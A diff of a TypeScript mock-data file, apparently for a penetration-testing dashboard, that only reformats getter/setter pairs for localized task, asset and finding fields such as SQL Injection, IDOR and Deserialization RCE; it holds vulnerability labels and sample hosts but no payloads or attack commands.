@@ -56,12 +56,24 @@ export const tasks: Task[] = [
   {
     id: "t-acme-web",
     category_id: 1,
-    get category_name() { return swt("interface.m2431"); },
-    set category_name(value: string) { Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2432"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2433"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get category_name() {
+      return swt("interface.m2431");
+    },
+    set category_name(value: string) {
+      Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2432");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2433");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -85,12 +97,24 @@ export const tasks: Task[] = [
   {
     id: "t-acme-api",
     category_id: 2,
-    get category_name() { return swt("interface.m2434"); },
-    set category_name(value: string) { Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2435"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2436"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get category_name() {
+      return swt("interface.m2434");
+    },
+    set category_name(value: string) {
+      Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2435");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2436");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -114,12 +138,24 @@ export const tasks: Task[] = [
   {
     id: "t-shop-pay",
     category_id: 2,
-    get category_name() { return swt("interface.m2434"); },
-    set category_name(value: string) { Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2437"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2438"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get category_name() {
+      return swt("interface.m2434");
+    },
+    set category_name(value: string) {
+      Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2437");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2438");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
     created_unix: 1785313800,
@@ -142,12 +178,24 @@ export const tasks: Task[] = [
   {
     id: "t-vpn-edge",
     category_id: 1,
-    get category_name() { return swt("interface.m2431"); },
-    set category_name(value: string) { Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2439"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2440"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get category_name() {
+      return swt("interface.m2431");
+    },
+    set category_name(value: string) {
+      Object.defineProperty(this, "category_name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2439");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2440");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -174,16 +222,24 @@ export const tasks: Task[] = [
 export const taskCategories: TaskCategory[] = [
   {
     id: 1,
-    get name() { return swt("interface.m2431"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2431");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_count: 2,
     created_at: T("2026-07-18T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    get name() { return swt("interface.m2434"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2434");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_count: 2,
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
@@ -193,23 +249,47 @@ export const taskCategories: TaskCategory[] = [
 export const taskTemplates: TaskTemplate[] = [
   {
     id: 1,
-    get name() { return swt("interface.m2441"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2442"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2443"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2441");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2442");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2443");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-20T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    get name() { return swt("interface.m2444"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
-    get description() { return swt("interface.m2445"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
-    get goal() { return swt("interface.m2446"); },
-    set goal(value: string) { Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2444");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get description() {
+      return swt("interface.m2445");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get goal() {
+      return swt("interface.m2446");
+    },
+    set goal(value: string) {
+      Object.defineProperty(this, "goal", { value, writable: true, enumerable: true, configurable: true });
+    },
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
   },
@@ -267,8 +347,19 @@ export const companies: Company[] = [
     logo: "",
     asset_count: 18,
     scope: [
-      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", get reason() { return swt("interface.m2447"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); } },
+      {
+        id: 1,
+        company_id: 1,
+        kind: "domain",
+        domain: "acme.com",
+        raw: "acme.com",
+        get reason() {
+          return swt("interface.m2447");
+        },
+        set reason(value: string) {
+          Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+        },
+      },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
     ],
@@ -283,8 +374,12 @@ export const assets: Asset[] = [
     task_ids: [1],
     domain: "acme.com",
     root_domain: "acme.com",
-    get icp() { return swt("interface.m2448"); },
-    set icp(value: string) { Object.defineProperty(this, "icp", { value, writable: true, enumerable: true, configurable: true }); },
+    get icp() {
+      return swt("interface.m2448");
+    },
+    set icp(value: string) {
+      Object.defineProperty(this, "icp", { value, writable: true, enumerable: true, configurable: true });
+    },
     record_type: "A",
     record_value: ["203.0.113.10"],
     last_seen: T("2026-07-26T02:00:00Z"),
@@ -409,13 +504,21 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://www.acme.com",
-    get app_name() { return swt("interface.m2449"); },
-    set app_name(value: string) { Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get app_name() {
+      return swt("interface.m2449");
+    },
+    set app_name(value: string) {
+      Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     category: "corp",
     status_code: 200,
     content_length: 48213,
-    get page_title() { return swt("interface.m2450"); },
-    set page_title(value: string) { Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true }); },
+    get page_title() {
+      return swt("interface.m2450");
+    },
+    set page_title(value: string) {
+      Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true });
+    },
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
     last_seen: T("2026-07-26T02:08:00Z"),
@@ -426,13 +529,21 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://admin.acme.com",
-    get app_name() { return swt("interface.m2451"); },
-    set app_name(value: string) { Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get app_name() {
+      return swt("interface.m2451");
+    },
+    set app_name(value: string) {
+      Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     category: "admin",
     status_code: 200,
     content_length: 12044,
-    get page_title() { return swt("interface.m2452"); },
-    set page_title(value: string) { Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true }); },
+    get page_title() {
+      return swt("interface.m2452");
+    },
+    set page_title(value: string) {
+      Object.defineProperty(this, "page_title", { value, writable: true, enumerable: true, configurable: true });
+    },
     technologies: ["Nginx", "Vue", "Element-UI"],
     last_seen: T("2026-07-26T02:09:00Z"),
   },
@@ -572,8 +683,12 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "http://10.10.10.20:8080",
-    get app_name() { return swt("interface.m2453"); },
-    set app_name(value: string) { Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true }); },
+    get app_name() {
+      return swt("interface.m2453");
+    },
+    set app_name(value: string) {
+      Object.defineProperty(this, "app_name", { value, writable: true, enumerable: true, configurable: true });
+    },
     category: "ci",
     status_code: 200,
     content_length: 14200,
@@ -617,20 +732,40 @@ export const findings: Finding[] = [
     id: "f-1",
     assets: [assetRef(18)],
     vulnclass: "SQL Injection",
-    get name() { return swt("interface.m2454"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2454");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     severity: "high",
     status: "pending",
-    get report() { return swt("interface.m2455"); },
-    set report(value: string) { Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true }); },
-    get summary() { return swt("interface.m2456"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2457"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get report() {
+      return swt("interface.m2455");
+    },
+    set report(value: string) {
+      Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get summary() {
+      return swt("interface.m2456");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2457");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i-2",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-26T01:20:00Z"),
   },
   {
@@ -639,14 +774,26 @@ export const findings: Finding[] = [
     vulnclass: "IDOR",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2459"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2460"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2459");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2460");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i-5",
     task_id: "t-acme-api",
-    get task_description() { return swt("interface.m2435"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2435");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-26T02:44:00Z"),
   },
   {
@@ -655,13 +802,25 @@ export const findings: Finding[] = [
     vulnclass: "Weak JWT",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2461"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2462"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2461");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2462");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-api",
-    get task_description() { return swt("interface.m2435"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2435");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-26T03:02:00Z"),
   },
   {
@@ -670,13 +829,25 @@ export const findings: Finding[] = [
     vulnclass: "Reflected XSS",
     severity: "medium",
     status: "pending",
-    get summary() { return swt("interface.m2463"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2464"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2463");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2464");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T22:10:00Z"),
   },
   {
@@ -685,13 +856,25 @@ export const findings: Finding[] = [
     vulnclass: "Exposed .git",
     severity: "medium",
     status: "pending",
-    get summary() { return swt("interface.m2465"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2466"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2465");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2466");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T20:30:00Z"),
   },
   {
@@ -700,14 +883,26 @@ export const findings: Finding[] = [
     vulnclass: "Default Credentials",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2467"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2468"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2467");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2468");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i-3",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-26T03:50:00Z"),
   },
   {
@@ -716,13 +911,25 @@ export const findings: Finding[] = [
     vulnclass: "Open Redirect",
     severity: "low",
     status: "pending",
-    get summary() { return swt("interface.m2469"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2470"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2469");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2470");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T19:12:00Z"),
   },
   {
@@ -731,13 +938,25 @@ export const findings: Finding[] = [
     vulnclass: "Missing Rate Limit",
     severity: "medium",
     status: "pending",
-    get summary() { return swt("interface.m2471"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2472"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2471");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2472");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T18:40:00Z"),
   },
   {
@@ -746,13 +965,25 @@ export const findings: Finding[] = [
     vulnclass: "Verbose Error",
     severity: "low",
     status: "pending",
-    get summary() { return swt("interface.m2473"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2474"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2473");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2474");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-acme-api",
-    get task_description() { return swt("interface.m2435"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2435");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T23:05:00Z"),
   },
   {
@@ -761,13 +992,25 @@ export const findings: Finding[] = [
     vulnclass: "Outdated Component",
     severity: "medium",
     status: "pending",
-    get summary() { return swt("interface.m2475"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2476"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2475");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2476");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     task_id: "t-shop-pay",
-    get task_description() { return swt("interface.m2437"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2437");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-23T15:00:00Z"),
   },
   // High-severity findings in the active external-to-internal assessment chain.
@@ -776,34 +1019,66 @@ export const findings: Finding[] = [
     vulnclass: "Hardcoded Credentials",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2477"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2478"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2477");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2478");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "ig",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T20:36:00Z"),
   },
   {
     id: "f-12",
     assets: [assetRef(4)],
     vulnclass: "Deserialization RCE",
-    get name() { return swt("interface.m2479"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2479");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     severity: "critical",
     status: "confirmed",
-    get report() { return swt("interface.m2480"); },
-    set report(value: string) { Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true }); },
-    get summary() { return swt("interface.m2481"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2482"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get report() {
+      return swt("interface.m2480");
+    },
+    set report(value: string) {
+      Object.defineProperty(this, "report", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get summary() {
+      return swt("interface.m2481");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2482");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i7",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T15:40:00Z"),
   },
   {
@@ -812,14 +1087,26 @@ export const findings: Finding[] = [
     vulnclass: "Privilege Escalation",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2483"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2484"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2483");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2484");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i8",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T16:20:00Z"),
   },
   {
@@ -828,14 +1115,26 @@ export const findings: Finding[] = [
     vulnclass: "Network Segmentation",
     severity: "medium",
     status: "pending",
-    get summary() { return swt("interface.m2485"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2486"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2485");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2486");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i9",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T21:00:00Z"),
   },
   {
@@ -844,14 +1143,26 @@ export const findings: Finding[] = [
     vulnclass: "Unauthenticated RCE",
     severity: "high",
     status: "pending",
-    get summary() { return swt("interface.m2487"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get evidence() { return swt("interface.m2488"); },
-    set evidence(value: string) { Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2487");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get evidence() {
+      return swt("interface.m2488");
+    },
+    set evidence(value: string) {
+      Object.defineProperty(this, "evidence", { value, writable: true, enumerable: true, configurable: true });
+    },
     intent_id: "i11",
     task_id: "t-acme-web",
-    get task_description() { return swt("interface.m2458"); },
-    set task_description(value: string) { Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true }); },
+    get task_description() {
+      return swt("interface.m2458");
+    },
+    set task_description(value: string) {
+      Object.defineProperty(this, "task_description", { value, writable: true, enumerable: true, configurable: true });
+    },
     ts: T("2026-07-25T21:50:00Z"),
   },
   {
@@ -860,34 +1171,66 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
